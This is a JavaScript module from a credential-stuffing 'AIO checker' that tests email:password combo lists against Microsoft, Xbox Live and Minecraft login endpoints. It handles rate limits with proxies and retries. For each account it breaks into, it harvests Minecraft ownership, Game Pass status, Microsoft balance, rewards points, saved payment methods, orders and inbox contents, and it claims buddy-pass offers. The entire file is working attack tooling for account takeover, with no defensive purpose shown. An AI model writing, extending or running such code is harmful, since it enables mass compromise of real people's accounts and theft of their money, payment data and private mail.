      const skinResult = await setMcSkin(token);
      if (skinResult) c.type = (c.type || "") + " [SET SKIN]";
    } catch { stats.errors++; }

    // Microsoft features
    try {
      const msResults = await checkMicrosoftAccount(jar, email, password);
      c.ms_balance = msResults.balance;
      c.ms_rewards = msResults.rewards_points;
      c.ms_payment_methods = msResults.payment_methods || [];
      c.ms_orders = msResults.orders || [];
      c.inbox_matches = msResults.inbox_results || [];
      if (c.ms_payment_methods.length) stats.payment_methods += c.ms_payment_methods.length;
      if (c.inbox_matches.length) stats.inbox_matches += c.inbox_matches.length;
    } catch { stats.errors++; }
  }

  // MeowAPI stats
  try {
    const statsText = await fetchMeowApiStats(name, uuid);
    if (statsText) {
      const sw = statsText.match(/SW: (\d+)/);
      if (sw) c.swstars = sw[1];
      const nw = statsText.match(/NW: ([^ ]+)/);
      if (nw) c.sbnetworth = nw[1];
      const purse = statsText.match(/Purse: ([^ ]+)/);
      if (purse) c.sbcoins = purse[1];
      const pit = statsText.match(/Pit_Gold: ([^ ]+)/);
      if (pit) c.pitcoins = pit[1];
    }
  } catch {}

  // Write hit
  results_hits.push(`${email}:${password}`);
  stats.hits++;

  // Full capture line
  const fullCapt = buildCaptureLine(c);
  results_capture.push(fullCapt);

  return c;
}

// ── checkmc — Minecraft entitlement & capture flow ──────────

async function checkMc(jar, email, password, token, xboxToken) {
  let acctype = null;
  let attempts = 0;
  const maxTime = Date.now() + 120000;

  while (attempts < maxretries && Date.now() < maxTime) {
    attempts++;
    try {
      const res = await fetch("https://api.minecraftservices.com/entitlements/license", {
        headers: { Authorization: `Bearer ${token}` },
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 429) {
        stats.retries++;
        await sleep(isNoProxy() ? randomFloat(10, 15) * 1000 : 100);
        continue;
      }
      const data = await res.json();
      acctype = checkOwnership(data);
      break;
    } catch {
      stats.retries++;
      await sleep(isNoProxy() ? 2000 : 100);
    }
  }

  if (!acctype) return false;

  // Get profile
  let name = "N/A", uuidStr = "N/A", capesList = [];
  try {
    const profRes = await fetch("https://api.minecraftservices.com/minecraft/profile", {
      headers: { Authorization: `Bearer ${token}` },
      signal: AbortSignal.timeout(10000),
    });
    if (profRes.ok) {
      const pData = await profRes.json();
      name = pData.name || "N/A";
      uuidStr = pData.id || "N/A";
      for (const c of pData.capes || []) {
        if (c.alias) capesList.push(c.alias);
      }
    }
  } catch {}

  const capesStr = capesList.join(", ");

  // Handle capture (only if NOT Game Pass only)
  if (!acctype.includes("Game Pass") || acctype.includes("Normal")) {
    try {
      await handleCapture(email, password, name, capesStr, uuidStr, token, acctype, jar);
    } catch {}
  }

  if (acctype === "Xbox Game Pass Ultimate" || acctype === "Normal Minecraft (with Game Pass Ultimate)") {
    stats.xgpu++;
    results_xgpu.push(`${email}:${password}`);
    if (acctype.includes("Normal")) results_normal.push(`${email}:${password}`);
    await claimBuddypassOffers(jar, xboxToken);
    // captureMc for Game Pass types
    try {
      await handleCapture(email, password, name, capesStr, uuidStr, token, acctype, jar);
    } catch {}
    return true;
  } else if (acctype === "Xbox Game Pass (PC)" || acctype === "Normal Minecraft (with Game Pass)") {
    stats.xgp++;
    results_xgp.push(`${email}:${password}`);
    if (acctype.includes("Normal")) results_normal.push(`${email}:${password}`);
    await claimBuddypassOffers(jar, xboxToken);
    try {
      await handleCapture(email, password, name, capesStr, uuidStr, token, acctype, jar);
    } catch {}
    return true;
  } else if (acctype === "Normal Minecraft") {
    results_normal.push(`${email}:${password}`);
    return true;
  }

  return true;
}

// ── authenticate — primary login + Xbox/MC pipeline ─────────

async function authenticate(email, password) {
  let currentTry = 0;

  while (currentTry <= maxretries) {
    try {
      const jar = new CookieJar();

      // Dynamic PPFT
      const { urlPost, sFTTag } = await getUrlPostSFTTag(jar);
      if (!urlPost || !sFTTag) return false;

      // Xbox RPS
      const token = await getXboxRps(jar, email, password, urlPost, sFTTag);

      if (token === "2FA") {
        stats.twofa++;
        return false;
      }
      if (token === "None" || !token) return false;

      let hit = false;
      try {
        // Xbox auth
        const xboxRes = await fetch("https://user.auth.xboxlive.com/user/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json", Accept: "application/json" },
          body: JSON.stringify({
            Properties: { AuthMethod: "RPS", SiteName: "user.auth.xboxlive.com", RpsTicket: token },
            RelyingParty: "http://auth.xboxlive.com",
            TokenType: "JWT",
          }),
          signal: AbortSignal.timeout(config.timeout * 1000),
        });
        const xboxJs = await xboxRes.json();
        const xboxToken = xboxJs.Token;

        if (xboxToken) {
          const uhs = xboxJs.DisplayClaims.xui[0].uhs;
          const xstsRes = await fetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
            method: "POST",
            headers: { "Content-Type": "application/json", Accept: "application/json" },
            body: JSON.stringify({
              Properties: { SandboxId: "RETAIL", UserTokens: [xboxToken] },
              RelyingParty: "rp://api.minecraftservices.com/",
              TokenType: "JWT",
            }),
            signal: AbortSignal.timeout(config.timeout * 1000),
          });
          const xstsJs = await xstsRes.json();
          const xstsToken = xstsJs.Token;

          if (xstsToken) {
            const accessToken = await getMcToken(jar, uhs, xstsToken);
            if (accessToken) {
              hit = await checkMc(jar, email, password, accessToken, xboxToken);
            }
          }
        }
      } catch {}

      // Payment extraction
      if (config.payment) {
        try {
          await extractPayment(jar, email, password);
        } catch {}
      }

      // Microsoft account features
      try {
        if (config.check_microsoft_balance || config.check_rewards_points || config.scan_inbox) {
          await checkMicrosoftAccount(jar, email, password);
        }
      } catch {}

      if (!hit) {
        // Valid mail
        stats.valid_mail++;
        results_valid_mail.push(`${email}:${password}`);
        // MeowAPI stats for valid mail
        try {
          const username = email.split("@")[0];
          if (username) {
            const mStats = await fetchMeowApiStats(username);
            if (mStats) {
              results_valid_mail[results_valid_mail.length - 1] += ` | MeowAPI: ${mStats}`;
            }
          }
        } catch {}
      }

      return !!hit;
    } catch {
      currentTry++;
      stats.retries++;
      if (currentTry > maxretries) return false;
    }
  }
  return false;
}

// ── Checker — wraps pre_check + authenticate ────────────────

async function Checker(combo) {
  try {
    combo = combo.trim();
    if (!combo || !combo.includes(":")) {
      stats.bad++;
      stats.checked++;
      return { status: "bad", email: combo };
    }

    const [email, ...rest] = combo.split(":");
    const password = rest.join(":").trim();
    if (!email || !password) {
      stats.bad++;
      stats.checked++;
      return { status: "bad", email };
    }

    let result = false;
    try {
      const bypass = await preCheckCombo(email.trim(), password);

      if (bypass === "HIT" || bypass === "UNKNOWN") {
        result = await authenticate(email.trim(), password);
      } else if (bypass === "2FA") {
        results_2fa.push(`${email}:${password}`);
        stats.twofa++;
        stats.checked++;
        return { status: "2fa", email };
      } else if (bypass === "BAD") {
        result = false;
      } else {
        result = false;
      }
    } catch {
      result = false;
    }

    stats.checked++;
    if (!result) {
      stats.bad++;
      if (config.save_bad) results_bads.push(`${email}:${password}`);
      return { status: "bad", email };
    }

    return { status: "hit", email };
  } catch (e) {
    stats.bad++;
    stats.checked++;
    stats.errors++;
    return { status: "fail", email: combo.split(":")[0] || combo };
  }
}

// ── Helpers ──────────────────────────────────────────────────

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function randomFloat(min, max) {
  return min + Math.random() * (max - min);
}

// ── Main runner (exposed API) ────────────────────────────────

async function runAioCheck(combos, threads = 30, onProgress, signal) {
  resetStats();
  resetResults();
  loadAioProxies();
  loadBanProxies();

  stats.total = combos.length;
  maxretries = config.max_retries;

  const { runPool } = require("./worker-pool");

  const results = await runPool({
    items: combos,
    concurrency: threads,
    maxRetries: 0,
    signal,
    scope: "aio-checker",
    runner: async (combo) => {
      if (signal?.aborted) return { status: "skipped", email: combo.split(":")[0] };
      return await Checker(combo);
    },
    onResult: (result, completed, total) => {
      if (onProgress) {
        try { onProgress(completed, total, result); } catch {}
      }
    },
  });

  return {
    results,
    stats: { ...stats },
    files: {
      hits: results_hits,
      normal: results_normal,
      xgp: results_xgp,
      xgpu: results_xgpu,
      twofa: results_2fa,
      valid_mail: results_valid_mail,
      bads: results_bads,
      capture: results_capture,
      cards: results_cards,
      banned: results_banned,
      unbanned: results_unbanned,
      mfa: results_mfa,
      sfa: results_sfa,
      ms_points: results_ms_points,
      ms_balance: results_ms_balance,
      subscriptions: results_subscriptions,
      orders: results_orders,
      billing: results_billing,
      inbox: results_inbox,
      codes: results_codes,
    },
  };
}

module.exports = { runAioCheck, getStats() { return stats; } };
